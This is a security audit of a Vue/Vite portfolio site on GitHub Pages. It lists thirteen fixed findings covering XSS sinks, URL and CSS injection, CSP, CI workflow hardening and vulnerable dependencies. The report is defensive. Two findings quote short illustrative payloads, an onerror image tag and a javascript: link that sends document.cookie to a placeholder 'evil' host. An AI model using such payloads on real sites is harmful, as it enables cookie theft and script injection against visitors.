# Security Audit — l4km47.github.io

**Date:** 2026-09-04
**Scope:** Vue 3 + Vite static portfolio (`src/`, `index.html`, `public/data/*.json`, GitHub Actions deploy workflow, npm dependency tree)
**Threat model:** Static site on GitHub Pages. No server, no database, no authentication, no user accounts. The realistic risks are therefore (a) client-side XSS through data that reaches DOM sinks, (b) supply-chain compromise of dependencies or CI, and (c) missing browser-side defence-in-depth.

All findings below have been fixed. Severities are qualitative, adjusted for this threat model.

---

## Findings

### 1. XSS — unescaped project data injected as HTML in the mermaid error path — **High**

`src/views/ProjectDetailView.vue` built an HTML string from `project.architecture` and assigned it to a `v-html` binding whenever `mermaid.render()` threw:

```js
mermaidSvg.value = `<p ...>Architecture diagram</p><pre ...>${project.value.architecture}</pre>`
```

A rendering failure is exactly the state a malformed or hostile diagram source produces, so any HTML in `projects.json` (`<img src=x onerror=...>`) would execute in the origin. Reaching it requires write access to `public/data/projects.json` — a repo compromise, a malicious PR, or a future CMS — but the fallback turned a *data* problem into script execution.

**Fix:** the fallback no longer produces markup. `mermaidSvg` is set to `''` and the template renders the diagram source as text through `<pre>{{ project.architecture }}</pre>`, which Vue escapes.

### 2. XSS hardening — mermaid `securityLevel` never pinned, and its SVG went straight into `v-html` — **Medium**

`mermaid.initialize()` did not set `securityLevel`, so the setting depended entirely on the library default. Mermaid's `loose` / `antiscript` levels permit HTML labels and `click` directives (which can bind JavaScript handlers) inside diagram source, and the rendered SVG was injected with `v-html` with no independent validation.

**Fix:**

- `securityLevel: 'strict'` and `htmlLabels: false` are now set explicitly, with a comment not to lower them.
- The rendered SVG passes through a second, independent `DOMPurify.sanitize()` call (SVG profile; `script` / `foreignObject` / `iframe` forbidden; `href` / `xlink:href` stripped) before it reaches `v-html`, so a bypass of mermaid's own sanitizer is not on its own enough for XSS.

### 3. XSS — `javascript:` URLs from data files could reach `href` / `src` — **Medium**

`project.demo`, `project.github`, `project.thumbnail` and `project.screenshots` were bound directly to `:href` / `:src` in `ProjectCard.vue` and `ProjectDetailView.vue`. Vue does not sanitize URL attribute bindings, so `"demo": "javascript:fetch('//evil/'+document.cookie)"` in `projects.json` would have produced a working XSS link.

**Fix:** new `src/utils/security.js` with `safeUrl()` (http / https / mailto only) and `safeAssetUrl()` (http / https or same-origin relative only). Every link and image in the project views renders from those computed, validated values, and the element is dropped entirely when a value fails validation.

### 4. XSS sink removal — icons rendered through `v-html` — **Low**

`HomeView.vue` and `SkillsView.vue` injected SVG icon markup with `v-html`. The strings were hard-coded, so there was no live vulnerability, but they were live HTML sinks one refactor away from being fed external data.

**Fix:** icons moved to `src/components/ui/AppIcon.vue`, which renders real SVG elements from structured shape data. No `v-html` remains outside the (double-sanitized) mermaid diagram.

### 5. CSS injection through style bindings — **Low**

`project.color` and `skill.color` from the JSON files were interpolated into `:style` bindings and CSS custom properties, and `skill.level` was concatenated into a width. Attacker-controlled CSS enables layout spoofing and `url()`-based exfiltration.

**Fix:** `safeColor()` accepts only `#hex` / `rgb()` / `hsl()` literals and otherwise falls back to the brand colour; skill levels are coerced to a number and clamped to 0–100.

### 6. No Content-Security-Policy and no referrer policy — **Medium**

The site shipped with no CSP, so any injection anywhere had the full origin available, and the default referrer policy leaked full URLs to third parties.

**Fix:** `index.html` now ships a strict policy via `<meta http-equiv="Content-Security-Policy">`:

```
default-src 'self'; base-uri 'self'; object-src 'none'; script-src 'self';
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:;
connect-src 'self'; worker-src 'self' blob:; frame-src 'none';
form-action 'none'; upgrade-insecure-requests
```

plus `<meta name="referrer" content="strict-origin-when-cross-origin">`. `'unsafe-inline'` is needed only for `style-src` (Vue inline style attributes and mermaid's in-SVG `<style>`); scripts get neither `unsafe-inline` nor `unsafe-eval`.

**Known limitation:** `frame-ancestors`, `X-Frame-Options` and `X-Content-Type-Options` cannot be delivered through a meta tag. GitHub Pages already sends `X-Frame-Options: DENY` and `X-Content-Type-Options: nosniff`. If the site ever moves behind a host that allows custom headers (Cloudflare, Netlify), serve the CSP as a real header and add `frame-ancestors 'none'`.

### 7. Reverse tabnabbing / referrer leakage on external links — **Low**

External links used `rel="noopener"` only; `noreferrer` was missing, so the destination received the full referring URL.

**Fix:** every `target="_blank"` link now uses `rel="noopener noreferrer"`, and remote-capable images carry `referrerpolicy="no-referrer"`.

### 8. CI — untrusted input interpolated into a workflow expression — **Medium**

`.github/workflows/deploy.yml` passed `${{ github.event.head_commit.message }}` into an action input. Commit messages are attacker-influenced content in the GitHub Actions threat model (the classic script-injection sink), and the job runs with a `GITHUB_TOKEN` scoped `contents: write`.

**Fix:** the deploy commit message is now the static `Deploy: ${{ github.sha }}`. No event-controlled text is interpolated into the workflow.

### 9. CI — unpinned actions and broader-than-needed permissions — **Medium**

All three actions were referenced by mutable tag (`@v4`), including a third-party one (`peaceiris/actions-gh-pages`); a moved or compromised tag would have executed arbitrary code with a write-scoped token. `permissions: contents: write` was granted workflow-wide, and checkout persisted credentials into the working tree for later steps.

**Fix:** every action is pinned to a full commit SHA (tag kept in a trailing comment), top-level `permissions: {}` with `contents: write` scoped to the deploy job only, `persist-credentials: false` on checkout, `npm ci --ignore-scripts` so no dependency lifecycle script runs in CI, a non-blocking `npm audit --audit-level=high` step, and a `concurrency` group so overlapping deploys cannot race.

### 10. Vulnerable dependencies — **High (aggregate)**

`npm audit` reported 5 advisories (2 moderate, 3 high) before the fix:

| Package | Was | Issue | Now |
|---|---|---|---|
| `vite` | 8.0.13 | `server.fs.deny` bypass on Windows alternate paths; launch-editor NTLMv2 hash disclosure (GHSA-fx2h-pf6j-xcff, GHSA-v6wh-96g9-6wx3) — dev server only | 8.2.2 |
| `mermaid` | 11.15.0 | prototype pollution in config APIs and architecture diagrams; CSS injection into sibling elements; DoS in xy/radar charts | 11.17.2 |
| `dompurify` | 3.4.5 | multiple sanitizer bypasses (`IN_PLACE`, shadow root, `CUSTOM_ELEMENT_HANDLING`, config pollution) | 3.4.14 |
| `postcss` | 8.5.x | path traversal via `sourceMappingURL` (GHSA-r28c-9q8g-f849, GHSA-fxqj-rqcc-2cmp) | 8.5.28 |
| `nanoid` | 3.3.17 | infinite loop with non-positive size | 3.3.18 |

**Fix:** dependencies upgraded, minimum ranges in `package.json` raised so a fresh install cannot resolve back to a vulnerable version, lockfile regenerated. `npm audit` now reports 0 vulnerabilities.

### 11. Unused dependencies enlarging the supply-chain surface — **Low**

`three` (~1 MB, never imported anywhere) and `pinia` (imported in `main.js`, but no store is ever defined) were installed. `pinia` also pulled `vue-demi`, the only package in the tree with an install-time lifecycle script.

**Fix:** both removed. The dependency tree now has no `postinstall` scripts, which is what makes `npm ci --ignore-scripts` safe in CI.

### 12. Unvalidated fetch path in the data composable — **Low**

`useData().fetchData(path)` passed its argument straight to `fetch()`. Nothing calls it with user input today, but as written it would happily fetch a cross-origin URL and cache the result.

**Fix:** the path must now match a root-relative same-origin pattern (no `..`), and the request is sent with `credentials: 'omit'`.

### 13. Contact form — unbounded input concatenated into a `mailto:` URL — **Informational**

The form builds a `mailto:` URL from visitor input. Values were already percent-encoded (so extra `&bcc=`-style parameters could not be smuggled in), but nothing capped the length and the subject was taken as-is from the bound value.

**Fix:** `maxlength` on every field, defensive clamping in JS, and the subject validated against the known option list.

---

## Accepted risks / not fixed

- **Contact details are public.** The email address and WhatsApp number are on the page by design and will be scraped. That is a consequence of publishing them, not a vulnerability.
- **`style-src 'unsafe-inline'`.** Required by Vue's inline style bindings and mermaid's in-SVG stylesheet. Script execution is unaffected.
- **Google Fonts loaded cross-origin without SRI.** Subresource Integrity cannot be used on the Google Fonts CSS endpoint (its content varies by user agent). The CSP pins the allowed hosts; self-hosting the fonts would remove the third party entirely if that trade-off is ever wanted.

## How to re-check

```bash
npm audit --audit-level=high
npm run build
grep -rn "v-html\|innerHTML\|eval(\|new Function" src/
```

Anything new in that last grep needs the same treatment as findings 1–4: sanitize at the boundary, or don't use the sink.
